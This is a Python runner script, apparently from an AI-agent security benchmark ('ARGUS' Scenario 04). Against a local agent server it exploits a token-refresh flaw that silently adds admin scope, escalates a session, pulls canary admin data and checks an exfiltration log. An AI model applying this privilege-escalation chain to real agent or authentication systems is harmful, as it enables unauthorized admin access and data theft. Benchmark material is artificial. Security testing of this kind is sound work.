#!/usr/bin/env python3
"""ARGUS Benchmark Scenario 04 — Privilege Chain Test Runner"""
import json, time, requests, sys

AGENT_URL = "http://localhost:8007"
CANARY = "ARGUS-CANARY-04"

def wait(timeout=30):
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            requests.get(f"{AGENT_URL}/health", timeout=2)
            print("[+] Agent ready")
            return True
        except Exception:
            time.sleep(1)
    return False

def call(name, args):
    r = requests.post(f"{AGENT_URL}/tools/call",
                      json={"name": name, "arguments": args})
    return r.json().get("result", {})

def main():
    print(f"\n{'='*60}")
    print(f"  ARGUS Benchmark — Scenario 04: Privilege Chain")
    print(f"{'='*60}\n")
    if not wait():
        sys.exit(1)

    print("[*] Step 1: Get user token (authorized)")
    tok_result = call("get_user_token", {"user_id": "attacker"})
    token = tok_result.get("token", "")
    print(f"    [+] Token: {token} scope={tok_result.get('scope')}")

    print("[*] Step 2: Refresh token (VULNERABILITY: silently adds admin scope)")
    ref_result = call("refresh_token", {"token": token})
    ref_token = ref_result.get("token", "")
    print(f"    [+] Refreshed token: {ref_token} scope={ref_result.get('scope')}")

    print("[*] Step 3: Escalate session using refreshed token")
    esc_result = call("escalate_session", {"token": ref_token})
    session_id = esc_result.get("session_id", "")
    admin = esc_result.get("admin_access_achieved")
    print(f"    [+] Session: {session_id} admin={admin}")

    print("[*] Step 4: Access admin data with escalated session")
    data_result = call("admin_get_data", {"session_id": session_id})
    canary = data_result.get("canary_extracted")
    print(f"    [+] Admin data canary: {canary}")

    exfil = requests.get(f"{AGENT_URL}/exfil-log").json().get("exfil_events", [])
    print(f"\n[+] Exfil events: {len(exfil)}")
    for e in exfil:
        print(f"    - {e.get('event')}")
    print(f"\n[+] Chain confirmed: get_user_token → refresh_token → escalate_session → admin_get_data\n")

if __name__ == "__main__":
    main()
